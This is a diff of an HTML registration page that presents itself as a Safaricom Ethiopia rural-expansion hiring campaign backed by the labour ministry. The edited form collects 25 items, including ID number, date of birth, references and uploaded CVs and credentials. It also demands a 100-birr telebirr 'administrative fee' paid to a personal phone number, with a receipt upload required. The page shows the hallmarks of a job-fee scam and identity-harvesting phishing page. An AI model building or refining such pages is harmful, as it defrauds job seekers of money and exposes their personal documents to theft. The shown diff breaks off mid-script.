@@ -3,83 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safaricom Ethiopia - የሥራና ስልጠና ምዝገባ</title>
+    <title>Safaricom Ethiopia Rural Expansion - ምዝገባ</title>
     <style>
-        :root { --safaricom-red: #e60000; --bg: #f8f9fa; --text: #333; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); margin: 0; padding: 20px; color: var(--text); }
-        .container { background: #fff; max-width: 1000px; margin: auto; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
+        /* ህብረ-ቀለማት እና አጠቃላይ ዲዛይን */
+        :root {
+            --gradient: linear-gradient(135deg, #e60000 0%, #700101 50%, #000000 100%);
+            --vibrant: linear-gradient(90deg, #ff8a00, #e60000, #9600ff);
+            --bg: #fdfdfd;
+        }
+        body { font-family: 'Segoe UI', 'Ubuntu', sans-serif; background: var(--bg); margin: 0; padding: 10px; color: #333; }
+        .container { background: #fff; max-width: 1100px; margin: 30px auto; padding: 40px; border-radius: 20px; box-shadow: 0 15px 50px rgba(0,0,0,0.15); border-top: 10px solid #e60000; }
         
-        /* Header & Text */
-        h2 { color: var(--safaricom-red); text-align: center; font-size: 24px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .full { grid-column: span 2; }
+        /* Typography */
+        h2 { background: var(--vibrant); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center; font-size: 32px; font-weight: 800; }
+        .hero-section { text-align: justify; line-height: 1.9; font-size: 17px; background: #fff5f5; padding: 30px; border-radius: 15px; border-left: 8px solid #e60000; margin-bottom: 30px; }
 
-        /* Form Wizard */
-        .tab { display: none; }
-        .active-tab { display: block; animation: fadeIn 0.5s ease; }
-        label { font-weight: bold; display: block; margin-bottom: 5px; color: #555; }
-        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
+        /* Form Horizontal Grid */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .full { grid-column: 1 / -1; }
+        
+        /* Inputs */
+        .tab { display: none; animation: slideIn 0.5s ease; }
+        .active-tab { display: block; }
+        label { font-weight: 600; font-size: 14px; margin-bottom: 5px; display: block; color: #555; }
+        input, select, textarea { width: 100%; padding: 14px; border: 2px solid #eee; border-radius: 10px; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
+        input:focus { border-color: #e60000; outline: none; background: #fffefe; }
 
         /* Buttons */
-        .btn-group { display: flex; justify-content: space-between; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; }
-        button { padding: 12px 35px; border-radius: 6px; border: none; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
-        .btn-next { background: var(--safaricom-red); color: #fff; }
-        .btn-prev { background: #e4e6eb; color: #333; }
-        button:hover { opacity: 0.9; }
+        .btn-group { display: flex; justify-content: space-between; margin-top: 40px; }
+        button { padding: 15px 40px; border-radius: 50px; border: none; cursor: pointer; font-weight: bold; font-size: 17px; transition: 0.4s; }
+        .btn-next { background: var(--gradient); color: white; box-shadow: 0 4px 15px rgba(230,0,0,0.3); }
+        .btn-prev { background: #eee; color: #555; }
+        button:hover { transform: scale(1.05); opacity: 0.9; }
 
-        /* Payment Box */
-        .payment-box { background: #fff8f8; border: 2px solid #ffcccc; padding: 25px; border-radius: 10px; margin-bottom: 20px; }
-        .notice { font-size: 14px; line-height: 1.6; color: #666; background: #fff; padding: 15px; border-radius: 6px; border-left: 5px solid var(--safaricom-red); margin-top: 15px; }
+        /* Success Page */
+        .success-name { font-size: 45px; font-weight: 900; background: var(--vibrant); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 20px 0; }
+        .split-view { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin-top: 40px; border-top: 2px solid #eee; padding-top: 30px; }
+        .lang-box { padding: 20px; border-radius: 12px; background: #f9f9f9; line-height: 1.8; text-align: justify; }
 
-        /* Success Split View */
-        .success-header { text-align: center; margin-bottom: 30px; }
-        .split-container { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; border-top: 3px solid var(--safaricom-red); padding-top: 25px; }
-        .split-box { line-height: 1.8; font-size: 16px; text-align: justify; }
-        .amharic { border-right: 1px solid #ddd; padding-right: 25px; direction: rtl; text-align: right; }
-        .english { padding-left: 25px; }
-
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div id="landing" class="active-tab">
-        <h2>ሳፋሪኮም ኢትዮጵያ ከሥራና ስልጠና ሚኒስቴር ጋር</h2>
-        <div style="text-align: justify; line-height: 1.8; padding: 20px; border: 1px solid #eee; border-radius: 8px;">
-            <p>ሳፋሪኮም ኢትዮጵያ ከሀገራዊ የሥራና ስልጠና ስትራቴጂ ጋር በመተባበር፣ የወጣቶችን የቴክኖሎጂ እና የምህንድስና አቅም ለመገንባት ሰፊ የሥራ ዕድል ጥሪ አቅርቧል። ይህ ምዝገባ ብቃትን መሠረት ያደረገ ሲሆን፣ ግልጽነትን ለማስፈን እና የተሟላ መረጃ ለመሰብሰብ ታስቦ የተዘጋጀ ነው። እባክዎ ሁሉንም ነጥቦች በጥንቃቄ በመሙላት የሀገራችን ዲጂታል ሽግግር አካል ይሁኑ።</p>
-            <button class="btn-next" style="width:100%" onclick="start()">ምዝገባ ለመጀመር እዚህ ይጫኑ / Start Registration</button>
+        <h2>ሳፋሪኮም ኢትዮጵያ - የገጠር ማስፋፊያ የቅጥር ዘመቻ</h2>
+        <div class="hero-section">
+            <p><strong>ሳፋሪኮም ኢትዮጵያ</strong> ዓለም አቀፍ ጥራቱን የጠበቀ የቴሌኮም አገልግሎት ለሁሉም ኢትዮጵያውያን ተደራሽ ለማድረግ በከፍተኛ ፍጥነት እየተንቀሳቀሰ ይገኛል። በአሁኑ ወቅት የኔትወርክ መሰረተ-ልማታችንን ወደ ክልል ከተሞች እና ጥግ ወደ አገሩ የገጠር መንደሮች ለማስፋት በወሰንነው መሠረት፣ እንደ እርስዎ ያሉ ንቁ፣ ታታሪ እና የቴክኖሎጂ ፍላጎት ያላቸው ወጣቶችን እንፈልጋለን።</p>
+            <p>ወደ ገጠር የሚደረገው ይህ ታሪካዊ ጉዞ የዲጂታል ኢትዮጵያን ብርሃን ለእያንዳንዱ አርሶ አደር እና ወጣት ተማሪ የሚያደርስ ነው። በዚህ ፕሮጀክት ላይ በመሳተፍ ሙያዊ ብቃትዎን ከማሳደግ ባለፈ፣ የሀገሪቱን የዲጂታል ሽግግር በግንባር ቀደምትነት የመምራት ዕድል ያገኛሉ። የሥራና ስልጠና ሚኒስቴርን መመሪያ በመከተል የተዘጋጀው ይህ ፎርም ለብቁ ወጣቶች በሯን ይከፍታል። 25ቱን መረጃዎች በጥንቃቄ በመሙላት ጉዞዎን ዛሬውኑ ይጀምሩ!</p>
+            <button class="btn-next" style="width:100%" onclick="startForm()">ምዝገባ ለመጀመር እዚህ ይጫኑ / Click to Start</button>
         </div>
     </div>
 
     <div id="formContainer" style="display:none;">
-        <form id="regForm" name="safaricom-job-portal" method="POST" data-netlify="true" enctype="multipart/form-data">
-            <input type="hidden" name="form-name" value="safaricom-job-portal" />
+        <form id="safaricomForm" name="rural-expansion" method="POST" data-netlify="true" enctype="multipart/form-data">
+            <input type="hidden" name="form-name" value="rural-expansion" />
 
             <div class="tab active-tab">
-                <h3>ደረጃ 1: የግል መረጃ (Personal Info)</h3>
+                <h3>ክፍል 1፡ የግል መረጃ (Step 1/4)</h3>
                 <div class="grid">
-                    <div><label>ሙሉ ስም (Full Name) *</label><input name="name" id="uName" required></div>
-                    <div><label>ስልክ (Phone) *</label><input name="phone" type="tel" required></div>
-                    <div><label>ጾታ (Gender)</label><select name="gender"><option>ወንድ/Male</option><option>ሴት/Female</option></select></div>
-                    <div><label>የትምህርት ደረጃ (Education Level)</label><input name="edu" required></div>
+                    <div><label>1. ሙሉ ስም ከነአባቱ (Full Name) *</label><input name="full_name" id="userName" required></div>
+                    <div><label>2. ጾታ (Gender)</label><select name="gender"><option>ወንድ/Male</option><option>ሴት/Female</option></select></div>
+                    <div><label>3. የትውልድ ቦታ (Place of Birth)</label><input name="birth_place"></div>
+                    <div><label>4. ዜግነት (Nationality)</label><input name="nationality"></div>
+                    <div><label>5. የትውልድ ቀን (Date of Birth)</label><input type="date" name="dob"></div>
+                    <div><label>6. የጋብቻ ሁኔታ (Marital Status)</label><select name="marital"><option>ያልገባ/Single</option><option>ያገባ/Married</option></select></div>
+                    <div><label>7. የመታወቂያ ቁጥር (ID No)</label><input name="id_no"></div>
                 </div>
             </div>
 
             <div class="tab">
-                <h3>ደረጃ 2: ክፍያና ሰነዶች (Payment & Documents)</h3>
-                <div class="payment-box">
-                    <p style="font-weight:bold; font-size:18px; color:var(--safaricom-red); margin:0;">የቴሌብር (telebirr) ክፍያ፡ 100 ብር</p>
-                    <p style="font-size:22px; font-weight:bold; margin:10px 0;">ቁጥር (Number): 0924364056</p>
-                    
-                    <div class="notice">
-                        <strong>ማሳሰቢያ፦</strong> ይህ የ100 ብር የአገልግሎት ክፍያ በቀጥታ ለቅጥር የሚከፈል ሳይሆን፣ የሳፋሪኮም ኢትዮጵያ ዲጂታል የሥራ መድረክን የቴክኒክ ደህንነት ለመጠበቅ፣ የመረጃ ቋቶችን (Database) ለማስተዳደር እና የትምህርት ማስረጃዎችዎን ትክክለኛነት በባለሙያ ለማረጋገጥ የሚውል የአስተዳደራዊ አገልግሎት (Administrative Fee) ነው። ክፍያው ምዝገባዎ በሲስተሙ ተቀባይነት እንዲያገኝ ያደርጋል።
-                    </div>
+                <h3>ክፍል 2፡ አድራሻና ትምህርት (Step 2/4)</h3>
+                <div class="grid">
+                    <div><label>8. ስልክ ቁጥር (Phone Number) *</label><input name="phone" type="tel" required></div>
+                    <div><label>9. ኢሜል (Email)</label><input name="email" type="email"></div>
+                    <div><label>10. ክልል (Region)</label><input name="region"></div>
+                    <div><label>11. ከተማ/ዞን (City/Zone)</label><input name="city"></div>
+                    <div><label>12. የትምህርት ደረጃ (Education Level)</label><input name="edu_level" required></div>
+                    <div><label>13. የተመረቁበት ተቋም (Institution)</label><input name="school"></div>
+                    <div><label>14. የምረቃ ዓመት (Year of Grad)</label><input name="grad_year"></div>
+                    <div><label>15. የጥናት መስክ (Field of Study)</label><input name="field"></div>
+                </div>
+            </div>
+
+            <div class="tab">
+                <h3>ክፍል 3፡ ልምድና ክህሎት (Step 3/4)</h3>
+                <div class="grid">
+                    <div><label>16. ጠቅላላ ውጤት (GPA)</label><input name="gpa"></div>
+                    <div><label>17. የቋንቋ ችሎታ (Languages)</label><input name="languages"></div>
+                    <div><label>18. ልዩ ክህሎት (Special Skills)</label><input name="skills"></div>
+                    <div><label>19. አጠቃላይ የሥራ ልምድ (Total Exp)</label><input name="exp"></div>
+                    <div><label>20. የመጨረሻ የሥራ መደብ (Last Job)</label><input name="last_job"></div>
+                    <div><label>21. የሚጠበቅ ደመወዝ (Expected Salary)</label><input name="salary"></div>
+                    <div class="full"><label>22. ማጣቀሻ/ረፈረንስ (References Name & Phone)</label><textarea name="references"></textarea></div>
+                </div>
+            </div>
+
+            <div class="tab">
+                <h3>ክፍል 4፡ ክፍያና ሰነዶች (Final Step)</h3>
+                <div style="background: #fff8e1; border: 2px dashed #ffc107; padding: 20px; border-radius: 12px; margin-bottom: 20px; text-align: center;">
+                    <h4 style="color: #d32f2f; margin:0;">የቴሌብር (telebirr) የአገልግሎት ክፍያ መመሪያ</h4>
+                    <p style="font-size: 22px; font-weight: bold; margin:10px 0;">ቁጥር (No): 0924364056</p>
+                    <p style="font-size: 14px; color: #666;">ማሳሰቢያ፦ ይህ የ100 ብር ክፍያ የሰነድ ማረጋገጫና የመረጃ ቋት አስተዳደራዊ አገልግሎት ነው።</p>
                 </div>
                 <div class="grid">
-                    <div><label>የክፍያ ደረሰኝ (Receipt) *</label><input type="file" name="receipt" required></div>
-                    <div><label>ሲቪ (CV) *</label><input type="file" name="cv" required></div>
-                    <div class="full"><label>የትምህርት ማስረጃ (Credentials) *</label><input type="file" name="docs" required></div>
+                    <div><label>23. የክፍያ ደረሰኝ (Payment Receipt) *</label><input type="file" name="receipt" required></div>
+                    <div><label>24. ሲቪ (CV/Resume) *</label><input type="file" name="cv" required></div>
+                    <div class="full"><label>25. የትምህርት ማስረጃዎች (Credentials/Degrees) *</label><input type="file" name="documents" required></div>
                 </div>
             </div>
 
@@ -90,58 +121,65 @@
         </form>
     </div>
 
-    <div id="successPage" style="display:none;">
-        <div class="success-header">
-            <h1 style="color:var(--safaricom-red); font-size:32px;">እንኳን ደስ አለዎት! / Congratulations!</h1>
-            <h2 id="finalName" style="color:#555;"></h2>
-        </div>
+    <div id="successPage" style="display:none; text-align: center;">
+        <h1 style="color:var(--safaricom-red);">Congratulations! / እንኳን ደስ አለዎት!</h1>
+        <div id="finalName" class="success-name"></div>
         
-        <div class="split-container">
-            <div class="split-box amharic">
-                <p>የምዝገባ ሂደቱን በስኬት አጠናቅቀዋል። ያስገቡት መረጃ፣ የትምህርት ማስረጃ እና የክፍያ ደረሰኝ በባለሙያዎቻችን እየታየ ይገኛል። መረጃው ተጣርቶ ለሥራው ተመራጭ ሆነው ከተገኙ በቀጣይ 7 የሥራ ቀናት ውስጥ በስልክዎ አጭር የጽሁፍ መልዕክት (SMS) ይላክልዎታል ወይም ስልክ ይደወልልዎታል። ለሀገር ግንባታ ላሳዩት ተሳትፎ እናመሰግናለን።</p>
+        <div class="split-view">
+            <div class="lang-box">
+                <p>የምዝገባ ሂደትዎ በስኬት ተጠናቅቋል። ያስገቡት የ100 ብር የአገልግሎት ክፍያ እና የትምህርት ማስረጃዎችዎ በባለሙያዎቻችን በኩል ተረጋግጠው፣ ለተመረጡት የገጠር ማስፋፊያ ፕሮጀክቶች ብቁ ሆነው ከተገኙ በቀጣይ ወራት ውስጥ በስልክዎ አጭር የጽሁፍ መልዕክት (SMS) ወይም ጥሪ ይላክልዎታል። ለሀገር ግንባታ ላሳዩት ዝግጁነት እናመሰግናለን።</p>
             </div>
-            <div class="split-box english">
-                <p>Your registration is complete. Our experts are currently reviewing your data, educational credentials, and payment receipt. If you are selected, you will receive an SMS notification or a phone call within the next 7 working days. Thank you for your commitment to national development.</p>
+            <div class="lang-box" style="direction: ltr;">
+                <p>Your registration is successful. Your 100 ETB administrative fee and educational credentials will be verified by our experts. If you are selected for our rural expansion projects, we will contact you via SMS or phone call within the coming months. Thank you for your commitment to national development.</p>
             </div>
         </div>
-        <button class="btn-next" style="margin:40px auto; display:block;" onclick="location.reload()">ጨርስ / Finish</button>
+        <button class="btn-next" style="margin-top:40px;" onclick="location.reload()">ተጠናቀቀ / Finish</button>
     </div>
 </div>
 
 <script>
-    let curr = 0;
+    let currentTab = 0;
     const tabs = document.getElementsByClassName("tab");
 
-    function start() {
+    function startForm() {
         document.getElementById("landing").style.display = "none";
         document.getElementById("formContainer").style.display = "block";
-        show(0);
+        showTab(0);
     }
 
-    function show(n) {
+    function showTab(n) {
         tabs[n].classList.add("active-tab");
-        document.getElementById("prevBtn").style.display = (n==0)?"none":"inline";
-        document.getElementById("nextBtn").innerHTML = (n==tabs.length-1)?"አረጋግጥ / Submit":"ቀጥል / Next";
+        document.getElementById("prevBtn").style.display = (n == 0) ? "none" : "inline";
+        document.getElementById("nextBtn").innerHTML = (n == tabs.length - 1) ? "መረጃውን ላክ / Submit" : "ቀጥል / Next";
     }
 
     function move(n) {
-        if (n == 1 && !validate()) return;
-        tabs[curr].classList.remove("active-tab");
-        curr += n;
-        if (curr >= tabs.length) { submit(); return; }
-        show(curr);
+        if (n == 1 && !validateForm()) return;
+        tabs[currentTab].classList.remove("active-tab");
+        currentTab += n;
+        if (currentTab >= tabs.length) { submitForm(); return; }
+        showTab(currentTab);
+        window.scrollTo(0,0);
     }
 
-    function validate() {
+    function validateForm() {
         let valid = true;
-        tabs[curr].querySelectorAll("input[required]").forEach(i => { if(!i.value) valid = false; });
-        if(!valid) alert("እባክዎ ሁሉንም መረጃዎች በትክክል ይሙሉ!");
+        const inputs = tabs[currentTab].querySelectorAll("input[required]");
+        inputs.forEach(input => {
+            if (!input.value) {
+                input.style.borderColor = "red";
+                valid = false;
+            } else {
+                input.style.borderColor = "#eee";
+            }
+        });
+        if (!valid) alert("እባክዎ ግዴታ የሆኑትን መረጃዎች በትክክል ይሙሉ!");
         return valid;
     }
 
-    function submit() {
-        const name = document.getElementById("uName").value;
-        const form = document.getElementById("regForm");
+    function submitForm() {
+        const name = document.getElementById("userName").value;
+        const form = document.getElementById("safaricomForm");
         fetch("/", { method: "POST", body: new FormData(form) }).then(() => {
             document.getElementById("formContainer").style.display = "none";
             document.getElementById("successPage").style.display = "block";
